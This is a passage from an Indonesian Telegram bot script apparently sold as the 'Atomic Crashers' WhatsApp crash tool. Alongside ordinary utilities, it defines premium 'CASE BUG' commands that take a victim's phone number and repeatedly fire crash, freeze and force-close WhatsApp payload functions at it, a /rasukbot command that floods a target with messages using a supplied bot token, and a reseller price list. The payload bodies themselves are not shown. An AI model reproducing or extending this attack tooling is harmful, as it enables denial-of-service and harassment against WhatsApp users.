    );

  
    fs.unlinkSync(filePath);

  } catch (error) {
    console.error(
      "REMOVEBG ERROR:",
      error.response?.data?.toString() || error.message
    );

    return ctx.reply(
      `❌ Gagal remove background:\n${
        error.response?.data?.toString() || error.message
      }`
    );
  }
});

bot.command("livejam", async (ctx) => {
  const chatId = ctx.chat.id;


  if (liveIntervals[chatId]) {
    clearInterval(liveIntervals[chatId]);
  }

  const msg = await ctx.reply(getTimeIndonesia());

  liveIntervals[chatId] = setInterval(async () => {
    try {
      await ctx.telegram.editMessageText(
        chatId,
        msg.message_id,
        null,
        getTimeIndonesia()
      );
    } catch (e) {
      clearInterval(liveIntervals[chatId]);
      delete liveIntervals[chatId];
    }
  }, 3000); 
});

bot.command("stopjam", (ctx) => {
  const chatId = ctx.chat.id;

  if (liveIntervals[chatId]) {
    clearInterval(liveIntervals[chatId]);
    delete liveIntervals[chatId];
    ctx.reply("⛔ Live clock dihentikan");
  } else {
    ctx.reply("❌ Tidak ada live clock yang aktif");
  }
});

bot.command("listharga", (ctx) => {
  ctx.reply(`
<pre>💰 LIST HARGA TITLE ATOMIC

━━━━━━━━━━━━━━━
5K NO UPDATE
10K FULL UPADATE 
15K RESELLER SC 
25K PATNER SC
35K OWNER SC
45K MODERATOR SC
━━━━━━━━━━━━━━━
Order: @pacenicwlee
</pre>`, { parse_mode: "HTML" });
});

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Atomic Crashers ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("enc", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;

    if (!reply || !reply.document) {
      return ctx.reply("❌ Reply file .js dengan command /enc");
    }

    const doc = reply.document;

    if (!doc.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus JavaScript (.js)");
    }

    const file = await ctx.telegram.getFile(doc.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    const res = await axios.get(fileUrl);
    let code = res.data;

    if (!code || code.length < 5) {
      return ctx.reply("❌ File kosong / tidak valid");
    }

    await ctx.reply("🔐 Encrypt aman sedang berjalan...");

  
    code = `/* Protected Script - ${ctx.from.first_name} */\n` + code;

    const obf = JavaScriptObfuscator.obfuscate(code, {
      compact: true,
      controlFlowFlattening: false,
      deadCodeInjection: false,
      debugProtection: false,
      disableConsoleOutput: true,
      stringArray: true,
      stringArrayEncoding: ["base64"],
      stringArrayThreshold: 0.75,
      stringArrayShuffle: true,
      splitStrings: true,
      splitStringsChunkLength: 5
    });

    const result = obf.getObfuscatedCode();

    await ctx.replyWithDocument({
      source: Buffer.from(result, "utf8"),
      filename: "enc_safe.js"
    }, {
      caption: "✅ Encrypt berhasil (reply mode)\n🔒 Stabil & Aman"
    });

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal encrypt");
  }
});

bot.command("rasukbot", async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const args = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  if (!args) {
    return ctx.reply(
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    if (reply) {
      const parts = args.split("|").map(x => x.trim());
      if (parts.length < 3) {
        return ctx.reply(
          "❌ Format salah!\nGunakan: <code>/rasukbot token|pesan|jumlah</code> (balas pesan target)",
          { parse_mode: "HTML" }
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {

      if (!args.includes("|")) {
        return ctx.reply(
          "📩 Format salah!\n\nGunakan format:\n" +
          "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
          "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
          { parse_mode: "HTML" }
        );
      }

      const parts = args.split("|").map(x => x.trim());
      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.reply(
        "❌ Format salah!\nGunakan: <code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.reply(
      `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.reply(
      `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.command("cekid", async (ctx) => {
  try {
    let target = ctx.from;

   
    if (ctx.message.reply_to_message) {
      target = ctx.message.reply_to_message.from;
    }

    const userId = target.id;
    const firstName = target.first_name || "-";
    const lastName = target.last_name || "";
    const username = target.username ? `@${target.username}` : "Tidak ada username";
    const fullName = `${firstName} ${lastName}`.trim();

    const teks = `
<blockquote><strong>「 CEK USER ID 」</strong></blockquote>
👤 Nama: ${fullName}
🆔 ID: <code>${userId}</code>
🔗 Username: ${username}
💬 Chat ID: <code>${ctx.chat.id}</code>
    `;

    await ctx.reply(teks, {
      parse_mode: "HTML"
    });

  } catch (e) {
    console.error("CEKID ERROR:", e);

    await ctx.reply(
      `❌ Error saat cek ID\n${e.message}`
    );
  }
});
/// Connect ////
bot.command("addsender", checkOwner, async (ctx) => {
  try {
    if (!sock) {
      return ctx.reply("❌ Socket belum siap. Restart bot dulu.");
    }

    if (isWhatsAppConnected && sock.user) {
      return ctx.reply("✅ WhatsApp sudah terhubung.");
    }

    if (global.pairingMessage) {
      return ctx.reply("⚠️ Pairing masih aktif, tunggu dulu.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("Example:\n/addsender 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    
    if (phoneNumber.length < 8 || phoneNumber.length > 15) {
      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/addsender 628xxxx");
    }

    await new Promise(r => setTimeout(r, 1000));

    const code = await sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.replyWithPhoto(
      "https://files.catbox.moe/xno1i6.jpg",//ganti jadi url catbox gambar lu
      {
        caption:
`<pre>⬡═―⊱「 𝒵𝒶𝓁𝒾𝓃𝒹𝓇𝒶 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ  Nomor  : ${phoneNumber}
ϟ  Kode   : ${formattedCode}
ϟ  Note  : KALO GAGAL PAIR HAPUS SENSASION 

ϟ  🟡 Status : Waiting for connection...
</pre>`,
        parse_mode: "HTML"
      }
    );

    global.pairingMessage = {
      chatId: msg.chat.id,
      messageId: msg.message_id
    };

    setTimeout(() => {
      global.pairingMessage = null;
    }, 60000);

  } catch (err) {
    console.log("Pairing error FULL:", err);
    global.pairingMessage = null;
    ctx.reply("❌ Gagal pairing!");
  }
});

/// ------ Kill Sesi -------- ///
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session dihapus, silakan /addsender ulang");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session");
  }
});
/// CASE BUG ///
bot.command("xsow", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /xsow 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝙰𝚃𝙾𝙼𝙸𝙲 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${cleanNumber}`, style: "success" }],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 25; i++) {
      await VnXDelayHard(sock, target);
      await VnXKayzenPaymentV2(sock, target);
      await sleep(900);
    }
  })();

});
/// CASE BUG ///
bot.command("ints", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /ints 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝙰𝚃𝙾𝙼𝙸𝙲 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${cleanNumber}`, style: "success" }],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 25; i++) {
      await VnXNewDelaySpamNotifAi(sock, target);
      await VnXNewDelaySpamNotifAi(sock, target);
      await sleep(1000);
    }
  })();

});

bot.command("xspam", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /xspam 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.reply(
`✘ 𝙰𝚃𝙾𝙼𝙸𝙲 𝙰𝚃𝚃𝙰𝙲𝙺 𝚈𝙾𝚄! ✘
♛ Success Terkirim : ${q}
♛ Status    : Bug Terkirim`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${cleanNumber}`, style: "success" }],
        ]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 20; i++) {
      await KayzenDelayHard(sock, target);
      await KayzenDelayHard(sock, target);
      await VnXNewDelayHardInpisBtns(sock, target)
      await sleep(950);
    }
  })();

});
/// CASE BUG ///
bot.command("Flowing", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /Flowing 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.replyWithPhoto(
  { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
  {
    caption:
`⬡═―—⊱ ⎧ ꁴꋬ꒒꒐ꋊ꒯ꋪꋬ ꒐ꋊ꒦꒒ꋬꇙ꒐ꄲꋊ ⎭ ⊰―—═⬡
ﾒ.- Target: ${q}
ﾒ.- Type: Not Spam Bugs
ﾒ.- Status: Sending`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [

          {
            text: "𝐂͜𝐇͢𝐄͡𝐂͜𝐊⍣᳟꙰⟅༑𝐍͜𝐔͢𝐌͡𝐁͜𝐄͢𝐑͡𝐒", 
            url: `https://wa.me/${cleanNumber}`, 
            style: "success"
          }
        ]
      ]
    }
  });

  (async () => {
    for (let i = 0; i < 20; i++) {
      await VnXNewFrezeeUrl(sock, target);
      await sleep(1000);
    }
  })();

});
/// CASE BUG 
bot.command("Cerox", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /Cerox 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.replyWithPhoto(
  { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
  {
    caption:
`⬡═―—⊱ ⎧ 𝐅͜𝐋͢𝐎͡𝐖͜𝐄͢𝐑͡𝐒⍣᳟꙰⟅༑𝐄͜𝐗͢𝐈͡𝐓 ⎭ ⊰―—═⬡
ﾒ.- Target: ${q}
ﾒ.- Type: Not Spam Bugs
ﾒ.- Status: Sending`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [

          {
            text: "𝐂͜𝐇͢𝐄͡𝐂͜𝐊⍣᳟꙰⟅༑𝐍͜𝐔͢𝐌͡𝐁͜𝐄͢𝐑͡𝐒", 
            url: `https://wa.me/${cleanNumber}`, 
            style: "success"
          }
        ]
      ]
    }
  });

  (async () => {
    for (let i = 0; i < 25; i++) {
      await VnxBlankKayzen(sock, target);
      await RapTheLightCrash(sock, target);
      await VnXNewOrderXlocaFrezee(sock, target);
      await sleep(1000);
    }
  })();

});
/// CASE BUG ///
bot.command("Xforce", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const text = ctx.message?.text || "";
  const q = text.split(" ")[1];

  if (!q) return ctx.reply("🪧 ☇ Example : /Xforce 62xx");

  const cleanNumber = q.replace(/[^0-9]/g, "");
  if (!cleanNumber) return ctx.reply("❌ Nomor tidak valid");

  const target = cleanNumber + "@s.whatsapp.net";

  await ctx.replyWithPhoto(
  { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
  {
    caption:
`⬡═―—⊱ ⎧ 𝐅͜𝐋͢𝐎͡𝐖͜𝐄͢𝐑͡𝐒⍣᳟꙰⟅༑𝐄͜𝐗͢𝐈͡𝐓 ⎭ ⊰―—═⬡
ﾒ.- Target: ${q}
ﾒ.- Type: Not Spam Bugs
ﾒ.- Status: Sending`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [

          {
            text: "𝐂͜𝐇͢𝐄͡𝐂͜𝐊⍣᳟꙰⟅༑𝐍͜𝐔͢𝐌͡𝐁͜𝐄͢𝐑͡𝐒", 
            url: `https://wa.me/${cleanNumber}`, 
            style: "success"
          }
        ]
      ]
    }
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      await fcdeltexi(sock, target);
      await ForcecloseCliks(sock, target);
      await VnXNewForceClickToPerma(sock, target);
      await sleep(1500);
    }
  })();

});

const fsp = fs.promises;
// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "name gh";
const DEFAULT_REPO = UPD.github_repo_default || "name repo";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "telegraf-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== COMMANDS ==================

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.command("update", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await ctx.reply(`⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`, { parse_mode: "Markdown" });

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.reply("✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfiles <repo> (reply file .js)
bot.command("addfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");

    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// /delfiles <repo> <path/file.js>
bot.command("dellfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;
    const file = parts[2];

    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
    }

    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});
  
// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});

// ------------ (  FUNCTION BUGS ) -------------- \\

// --- Jalankan Bot --- //
(async () => {
  try {
    console.clear();

    currentMode = getMode();

    
    await startSesi();

    
    await bot.launch();

    process.once("SIGINT", () => bot.stop("SIGINT"));
    process.once("SIGTERM", () => bot.stop("SIGTERM"));

    console.log("✅ Bot Telegram launched");
    console.log("🟢 System ready");

  } catch (err) {
    console.error("❌ Failed to start:", err);

    setTimeout(() => {
      
      process.exit(1);
    }, 3000);
  }
})();